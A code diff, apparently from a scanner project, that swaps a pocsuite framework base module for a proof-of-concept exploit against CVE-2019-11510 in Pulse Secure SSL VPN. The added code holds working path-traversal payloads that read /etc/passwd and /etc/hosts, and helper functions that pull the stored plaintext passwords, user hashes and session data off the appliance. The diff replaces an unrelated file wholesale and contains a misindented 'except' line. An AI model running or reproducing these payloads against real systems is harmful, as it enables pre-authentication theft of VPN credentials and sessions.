@@ -1,142 +1,132 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+# @Time : 2019/8/22 14:15
+# @Author : 兀
+# @File : CVE-2019-11510.py
+# @Software: PyCharm
+# @Blog : https://3.1415926.top
+# Life is Fantastic.
 
-from requests import exceptions as reqex
+import urlparse
 
-from pocsuite.api.utils import str_to_dict
-from pocsuite.lib.core.common import parse_target_url
-from pocsuite.lib.core.data import conf, logger
-from pocsuite.lib.core.enums import ERROR_TYPE_ID, OUTPUT_STATUS
+from pocsuite.api.poc import POCBase
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output
+from pocsuite.api.request import req
 
 
-class POCBase:
-    """
-    所有POC类的基础
-    """
+class TestPOC(POCBase):
 
-    def _verify(self):
-        """
-        以Poc的verify模式对urls进行检测(可能具有危险性)
-        需要在用户自定义的Poc中进行重写
-        返回一个Output类实例
-        """
-        raise NotImplementedError
+    vulID = 'CVE-2019-11510'
+    version = '1'
+    author = '兀'
+    vulDate = '2019-08-10'
+    createDate = '2019-08-14'
+    updateDate = '2019-08-14'
+    references = [
+        "https://hackerone.com/reports/591295",
+        "https://github.com/projectzeroindia/CVE-2019-11510/blob/master/CVE-2019-11510.sh",
+        "https://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html"
+    ]
+    name = 'Pulse Secure SSL VPN Pre-auth'
+    appPowerLink = 'https://www.pulsesecure.net/'
+    appName = 'Pulse Secure SSL VPN '
+    appVersion = '''
+     8.1R15.1 / 8.2 / 8.3 / 9.0 
+    '''
+    vulType = ''
+    desc = '''
+    '''
+    samples = [
+    ]
+    install_requires = ""
 
     def _attack(self):
-        """
-        以Poc的verify模式对urls进行检测(可能具有危险性)
-        需要在用户自定义的Poc中进行重写
-        返回一个Output类实例
-        """
-        raise NotImplementedError
+        return self._verify()
 
-    def execute(self,
-                target,
-                headers=None,
-                params=None,
-                mode='verify',
-                verbose=True):
-        """
-        url: the target url
-        headers: a class dict include some fields for request header
-        params: a instance of Params, include extra params
-        """
-        self.target = target
-        self.url = parse_target_url(target)
-        self.header = headers
-        self.params = params and str_to_dict(params) or {}
-        self.mode = mode
-        self.verbose = verbose
-        self.exception = None
-
+    def _verify(self):
+        result = {}
+        self.raw_url = self.url
+        host = urlparse.urlparse(self.url).hostname
+        port = urlparse.urlparse(self.url).port
+        scheme = urlparse.urlparse(self.url).scheme
+        if port is None:
+            port = "80"
+        else:
+            port = str(port)
+        if "https" == scheme:
+            self.url = "%s://%s" % (scheme, host)
+        else:
+            self.url = "%s://%s:%s" % (scheme, host, port)
+        paylaod = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
+        headers = {"User-Agent": "Mozilla/5.0",
+                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                   "Upgrade-Insecure-Requests": "1"}
         try:
-            call = [self._attack, self._verify][self.mode == 'verify']
-            output = call()
-        except NotImplementedError as e:
-            self.exception = (ERROR_TYPE_ID.NOTIMPLEMENTEDERROR.value, e)
-            logger.error(f"POC: '{self.name}' not defined '{self.mode}' mode.")
-            output = Output(self)
-        except reqex.ConnectTimeout as e:
-            self.exception = (ERROR_TYPE_ID.CONNECTTIMEOUT.value, e)
+            res = req.get(self.url + paylaod, verify=False, headers=headers, timeout=(10, 15))
+            if "root:x:0:0:root" in res.text and res.status_code == 200:
+                result["VerifyInfo"] = {}
+                result["VerifyInfo"]["URL"] = self.url
+                result["VerifyInfo"]["passwd"] = res.text
+                result["VerifyInfo"]["host"] = self.get_hosts()
+         except Exception as e:
+            pass
+        return self.parse_output(result)
 
-            while conf.retry > 0:
-                logger.warn(f"POC: '{self.name}' timeout, start it over.")
-                try:
-                    output = call()
-                except reqex.ConnectTimeout:
-                    logger.warn(f"POC: '{self.name}' timeout, start it over.")
-                conf.retry -= 1
-            else:
-                logger.error(str(e))
-            output = Output(self)
-
-        except reqex.HTTPError as e:
-            self.exception = (ERROR_TYPE_ID.HTTPERROR.value, e)
-            logger.error(
-                f"POC: '{self.name}' HTTPError occurs, start it over.")
-            output = Output(self)
-
-        except reqex.ConnectionError as e:
-            self.exception = (ERROR_TYPE_ID.CONNECTIONERROR.value, e)
-            logger.error(f"ConnectionError {e}")
-            output = Output(self)
-
-        except reqex.TooManyRedirects as e:
-            self.exception = (ERROR_TYPE_ID.TOOMANYREDIRECTS.value, e)
-            logger.error(f"TooManyRedirects {e}")
-            output = Output(self)
-
+    def get_hosts(self):
+        payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/"
+        headers = {"User-Agent": "Mozilla/5.0",
+                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                   "Upgrade-Insecure-Requests": "1"}
+        try:
+            res = req.get(self.url + payload, verify=False, headers=headers, timeout=(10, 15))
+            return res.text
         except Exception as e:
-            self.exception = (ERROR_TYPE_ID.OTHER.value, e)
-            logger.error(f"Exception {e}")
-            output = Output(self)
+            return None
 
+    def get_user_password(self):
+        payload_palntext_passwd = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?" \
+                  "/dana/html5acc/guacamole/"
+        payload_user_hash = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/system?" \
+                    "/dana/html5acc/guacamole/"
+
+        headers = {"User-Agent": "Mozilla/5.0",
+                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                   "Upgrade-Insecure-Requests": "1"}
+        try:
+            plantextpasswd = req.get(self.url + payload_palntext_passwd, verify=False, headers=headers,
+                                      timeout=(10, 15)).text
+        except Exception as e:
+            plantextpasswd = ''
+        try:
+            userhash = req.get(self.url + payload_user_hash, verify=False, headers=headers, timeout=(10, 15)).text
+        except Exception as e:
+            userhash = ''
+        return plantextpasswd, userhash
+
+    def get_session(self):
+        payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/" \
+                  "data.mdb?/dana/html5acc/guacamole/"
+        headers = {"User-Agent": "Mozilla/5.0",
+                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                   "Upgrade-Insecure-Requests": "1"}
+        try:
+            res = req.get(self.url + payload, verify=False, headers=headers, timeout=(10, 15))
+            return res.text
+        except Exception as e:
+            return ""
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('Internet nothing returned')
         return output
 
 
-class Output:
-    def __init__(self, poc=None):
-        self.error = ''
-
-        if poc is not None:
-            self.url = poc.url
-            self.mode = poc.mode
-            self.vul_id = poc.vulID
-            self.name = poc.name
-            self.app_name = poc.appName
-            self.app_version = poc.appVersion
-            self.error = poc.exception
-        self.result = {}
-        self.status = OUTPUT_STATUS.FAILED.value
-
-    def is_success(self):
-        return bool(self.status)
-
-    def success(self, result):
-        assert isinstance(result, dict)
-        self.status = OUTPUT_STATUS.SUCCESS.value
-        self.result = result
-
-    def fail(self, error):
-        self.status = OUTPUT_STATUS.FAILED.value
-        assert isinstance(error, str)
-
-        if isinstance(self.error, str):
-            error = (0, error)
-        self.error = error
-
-    def show_ersult(self):
-        if self.status == OUTPUT_STATUS.SUCCESS.value:
-            info_msg = f"poc-{self.vul_id} '{self.name}' has already been "
-            info_msg += f"detected against '{self.url}'."
-            logger.success(info_msg)
-
-            for k, v in self.result.items():
-                if isinstance(v, dict):
-                    for kk, vv in v.items():
-                        logger.success("{kk} : {vv}")
-                else:
-                    logger.success("{k} : {v}")
-        else:
-            err_msg = f"poc-{self.vul_id} '{self.name}' failed."
-            logger.error(err_msg)
+register(TestPOC)
